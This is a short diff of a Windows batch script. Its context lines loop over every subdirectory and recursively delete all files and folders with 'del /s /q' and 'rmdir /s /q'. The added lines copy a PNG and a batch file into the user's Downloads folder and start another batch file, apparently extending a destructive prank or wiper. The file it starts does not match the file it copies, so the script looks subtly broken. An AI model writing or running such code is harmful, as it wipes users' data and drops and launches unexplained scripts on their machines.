@@ -11,4 +11,7 @@ for /D %%A in (*) do (
     del * /s /q | for /D %%p IN (*) DO rmdir "%%p" /s /q
     cd ..
 )
+copy thumboi.png C:/Users/%username%/Downloads
+copy thumb.bat C:/Users/%username%/Downloads
+start thumboi.bat
 
